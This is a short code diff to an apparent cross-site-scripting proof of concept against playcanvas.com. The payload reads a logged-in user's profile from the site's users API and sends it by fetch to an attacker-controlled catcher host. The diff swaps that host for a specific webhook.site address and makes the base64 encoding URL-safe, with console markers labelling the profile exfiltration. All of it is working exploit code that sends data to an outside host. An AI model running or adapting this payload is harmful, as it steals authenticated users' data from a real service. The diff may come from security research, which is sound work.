@@ -61,7 +61,7 @@ This PoC reads the authenticated <code>/api/users/{id}</code> response (the one 
 // SET THIS to your attacker catcher host (no scheme, no trailing slash).
 //   webhook.site  ->  "webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
 //   interactsh    ->  "xxxxxxxxxxxxxxxxxxxx.oast.online"
-var CATCHER = "dal6ukhmmo1iqo7puo8ghxr84mdo97qfn.oast.live";
+var CATCHER = "webhook.site/99366d00-5bd3-42b6-b044-6f85181cb376";
 // ============================================================
 
 var O = "https://playcanvas.com";
@@ -82,7 +82,7 @@ var p = [
 ".then(function(t){",
   "console.log('===XSS_PROFILE_EXFIL===');",
   "console.log('PROFILE:'+t);",
-  "fetch('https://",CATCHER,"/pc/'+btoa(unescape(encodeURIComponent(t))),{mode:'no-cors'});",
+  "fetch('https://",CATCHER,"/pc/'+btoa(unescape(encodeURIComponent(t))).split('+').join('-').split('/').join('_'),{mode:'no-cors'});",
   "console.log('SENT_TO_ATTACKER')",
 "})"
 ].join('');
